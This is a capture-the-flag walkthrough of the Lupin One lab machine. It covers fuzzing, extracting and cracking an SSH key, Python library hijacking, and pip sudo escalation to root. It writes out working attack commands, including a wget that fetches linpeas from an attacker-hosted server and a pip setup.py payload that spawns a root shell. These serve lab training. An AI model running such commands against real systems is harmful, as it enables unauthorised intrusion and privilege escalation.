# Empire : Lupin one  CTF writeup

## Tools used

- Netdiscover
- Nmap
- Ffuf
- Gobuster
- dcode for cipher identification and decryption
- Cyberchef
- ssh2john
- John the ripper

## Step 1 (Enumeration)

To find the IP address of the target machine within the network we set up we can use `netdicover` using the command `sudo netdiscover` this gives the following output;

<img width="623" height="151" alt="image" src="https://github.com/user-attachments/assets/1dbeb497-e21b-4551-961d-6d4066f8f04a" />

You may also use nmap as follows;

<img width="1241" height="555" alt="image" src="https://github.com/user-attachments/assets/9f22e628-e41a-46aa-85b3-4b33e46f9f14" />

The above method may be used if you already know the network range. If the range is unknown you may use `netdiscover` then use `nmap` on the specific IP address.

<img width="1287" height="392" alt="image" src="https://github.com/user-attachments/assets/56936486-8f64-444b-a500-1d9864d9a9bd" />

Now that we have scanned for open ports we find two of them.
    - Port 22 - This is used for SSH that may be used for remote login.
    - Port 80 - This used for HTTP which indicates that it is a web server but unlike HTTPS which is found on port 443, HTTP is less secure.
    
## Step 2 ( Web Fuzzing)

Now that we know that there exists a web server on the machine we can use the URL `http://10.38.1.117` to go to the web page.

<img width="950" height="885" alt="image" src="https://github.com/user-attachments/assets/fd4332ea-c056-414b-8579-111badeb3e85" />

We find nothing much here.

## Step 3

Using gobuster or ffuf we can search for hidden directories in the web server.
Gobuster gives the following output;

 <img width="783" height="477" alt="image" src="https://github.com/user-attachments/assets/8f087ca5-e4b3-496b-a7c2-64ca3607e3fd" />

`gobuster dir -u http://10.38.1.117/ -k -w /usr/share/wordlists/dirb/common.txt`
    - `-u` indicates the target URL 
    - `-w` indicates the wordlist used in searching.
    - `-k` skips ssl certificates of which in our case it does not matter since we are working with a HTTP website and not a HTTPS.
    
ffuf can be used using the command `$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.38.1.117/FUZZ.txt`
`-w` and `-u` are used in the same way as they were for gobuster. The `FUZZ.txt` indicates that we a re looking for a .txt file. If we weren't looking for the .txt file we could just use FUZZ.

<img width="933" height="687" alt="image" src="https://github.com/user-attachments/assets/d466bba0-3afe-4b32-b132-4df822daeba6" />

We are able to find a robots.txt file (Highlighted in yellow).

To open the robots.txt file we can use the URL http://10.38.1.117/robots.txt.

<img width="947" height="195" alt="image" src="https://github.com/user-attachments/assets/e5bcf602-d613-4a2f-ae5f-cd56ce005ac8" />

Here we find another mentioned directory `/~myfiles`.

When we go to the URL http://10.38.1.117/~myfiles find nothing of importance but a motivational quote. `You can do it, keep trying.`

<img width="942" height="352" alt="image" src="https://github.com/user-attachments/assets/2c6f543a-79f4-4479-ac1b-d3d492fb2330" />

## Step 4

The `~myfiles` directory also opens our minds to the possibility of there being directories with the prefix `~`.

So we can now use ffuf with that in mind using the command `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.38.1.117/~FUZZ`

<img width="824" height="419" alt="image" src="https://github.com/user-attachments/assets/2551e9bd-faae-4fc8-9954-006fc303ab19" />

This returns a directory called `~secret` that we can access using the URL http://10.38.1.117/~secret

The URL has a message informing us that there is an ssh private key we need to find within the file and we need to use fasttrack to crack the passwords.

<img width="926" height="111" alt="image" src="https://github.com/user-attachments/assets/cfc53c8f-1234-42d3-b4b4-bd172005da5d" />

Using `ffuf` to continue searching for hidden directories under the `~secret` directory using the command `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.38.1.117/~secret/FUZZ.txt`

This gives a lot of directories but looking at the ones with different statuses, Sizes, Words or lines we find 2 of them `#` and `mysecret`.

<img width="933" height="766" alt="image" src="https://github.com/user-attachments/assets/7115d4f8-9203-46c3-a6ab-01834b060d59" />

<img width="759" height="152" alt="image" src="https://github.com/user-attachments/assets/0fa57ea9-9b8b-4f3a-a03f-2f14d9c29926" />

We can ignore the # directory since it is just the default and we would see the same message we saw in the `~secret` directory.

Moving on to the mysecret directory `http://10.38.1.117/~secret/.mysecret.txt` we find the encrypted message that we were instructed to decrypt in order to find the ssh private key.

## Step 5 (Decryption)

We need to know the encoding format that was used and the tools that you will use to decrypt the text.
We will use the Cipher Identifier tool on the dcode website.

Now to access the internet and go to the dcode website you need to save the VM state and change the VM network settings to bridged adapter.

Go to the URL https://www.dcode.fr/cipher-identifier and paste the message.

After the analysis the tools points out that the most probable format is base 58.

<img width="949" height="760" alt="image" src="https://github.com/user-attachments/assets/7eb2220d-e63e-485c-8bfc-de75726f5dce" />

Now that we know what format the text is in we can move on to https://gchq.github.io/CyberChef/ , paste the text in the input, select the data format tab and select `from Base 58`. The tool decrypts the text and gives us the OPENSSH private key.

<img width="1919" height="894" alt="image" src="https://github.com/user-attachments/assets/945df1e0-ec40-4e88-a963-07d9b9190827" />

Copy the output and using `nano` we can save the text.
`sudo nano ssh_key_lupin_one.rsa` this is the command used to create a file in nano. `ssh_key_lupin_one` is just the file name.

<img width="292" height="42" alt="image" src="https://github.com/user-attachments/assets/329e8100-86bb-4268-adbd-a7b6e8b4376b" />

Paste the text, save it and exit nano.

## Step 6 (Password Extraction)

Using ssh2john we can extract hashes from the private key that will help us find the password.

<img width="355" height="49" alt="image" src="https://github.com/user-attachments/assets/abaef027-c574-4123-99f6-54b12b8596c7" />

This command extracts all hashes from the private key and saves them in a file called hash.

We can then use jack the ripper to crack those hashes.

<img width="799" height="217" alt="image" src="https://github.com/user-attachments/assets/f43aa846-cd27-460a-ae08-30e7e0a3f311" />

So we can see that we have cracked the password and username.

## Step 7 (SSH Connection)

Now go save your machine state and change your VM's network settings back to internal network (if you used my procedure of setting up). This puts your kali machine and the target VM on the same network so they can communicate. 

We can then access the target machine using `ssh` as follows and enter the password as instructed;

<img width="638" height="264" alt="image" src="https://github.com/user-attachments/assets/ad5f2181-d98e-4834-9c01-387b27a7c0f6" />

Once the connection has been set up and we have access to the user `icex@LupinOne` we can `ls` to see all available files and folders.

We find one file and using `cat` we can open it and see the contents.

<img width="702" height="646" alt="image" src="https://github.com/user-attachments/assets/4652db08-3ad4-4ad8-9f4b-12cd4b3889ec" />

You could perform more enumeration using ls -al to see all hidden files and directories.

<img width="759" height="193" alt="image" src="https://github.com/user-attachments/assets/a964fd28-8ce6-4550-a834-398c4cb518f5" />

## Step 8 (Privilege Escalation)

We can check the user's privileges using `sudo -l` and here we find the following;

<img width="906" height="99" alt="image" src="https://github.com/user-attachments/assets/76ded8a1-58c0-4047-a119-8353b833dbf2" />

We can see that the user has permissions to run a python script.

This tells us that the machine is vulnerable to python library hijacking.

You can learn more about it here https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8 

Using `cat` we can check the script's content.

<img width="445" height="100" alt="image" src="https://github.com/user-attachments/assets/442f6e03-6e0b-451f-8c21-50cdb617c15b" />

The script seems to call the webbrowser library and print out the webbrowser's URL.

We can try to locate where the lwebbrowser library using `locate webbrowser`.

This does not work. 

We can try escalating our privileges using linpeas.

You can install linpeas using the command, `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

Then make it executable using `chmod +x linpeas.sh`

<img width="941" height="688" alt="image" src="https://github.com/user-attachments/assets/2dc254ad-cb06-477f-862a-0cabbe3637e0" />

Now create a separate terminal and launch a basic http server

<img width="549" height="103" alt="image" src="https://github.com/user-attachments/assets/1196a979-90a5-4eb2-8bc8-b2deeebe28e2" />

Change the directory to `/tmp` and then type in `wget 10.38.1.110/linpeas.sh`. This creates a connection and the linpeas file will be successfully imported to the target machine.

<img width="564" height="187" alt="image" src="https://github.com/user-attachments/assets/def84c65-2034-469e-a408-dd21bea307a0" />

Using `ls` we can confirm that the file has been imported successfully.

<img width="707" height="81" alt="image" src="https://github.com/user-attachments/assets/c8b9637a-85a0-44b9-9dba-3cfe84207bb8" />

Now grant the file executional permissions using `chmod` and execute it.

<img width="488" height="47" alt="image" src="https://github.com/user-attachments/assets/c4693e55-6713-452e-9d51-b2971f39249e" />

Once executed we can finally locate the webbrowser file.

<img width="807" height="764" alt="image" src="https://github.com/user-attachments/assets/2cece744-0397-4a98-84ba-bb6cacef21f8" />

Using `nano` open the python script and edit it as follows;

<img width="799" height="769" alt="image" src="https://github.com/user-attachments/assets/b5943d01-0888-400a-b18f-754c6c4a5b50" />

Add the highlighted line and do not change anything else.

This line helps us launch a bash shell. A bash shell is a CLI (Command Line Interface) used to interact with linux and unix operating systems. This allows someone to type in commands that the OS executes.

Now since the `icex64` user cannot execute the python script, we will use the python library hijacking method to change the user.

You can see here the `icex64` user's permissions and we can also see that there is another user called `arsene`. 

We can change the user using the command `sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`

Now you can note that the user has changed.

<img width="708" height="41" alt="image" src="https://github.com/user-attachments/assets/2b2728c4-db9b-4d84-9f8d-0fe04d183a68" />

## Step 9 (pip privilege escalation)

Using `sudo -l` you can view the new user's permissions. 

<img width="707" height="109" alt="image" src="https://github.com/user-attachments/assets/d77d752b-61db-46c5-90df-8682b8c7f69d" />

Here, we can see that machine is vulnerable to pip privilge escalation.

You can learn more about pip privilge escalation from https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/

`TF=$(mktemp -d)`
`echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
`sudo pip install $TF`

Run the above programs one by one.

This logs you as the root user. You can confrim this using the command `id`.

<img width="803" height="180" alt="image" src="https://github.com/user-attachments/assets/597fe93d-d94e-4204-b8b8-2c3ec7fd9b43" />

Now change the directory and use `ls` to list the available files.

<img width="504" height="164" alt="image" src="https://github.com/user-attachments/assets/7bdd2ec5-a61d-445e-b598-06894e5cf49b" />

Here we find the root flag.

# Congratulations on completing this CTF
# Wishing you happy hacking
# Remember to stay ethical
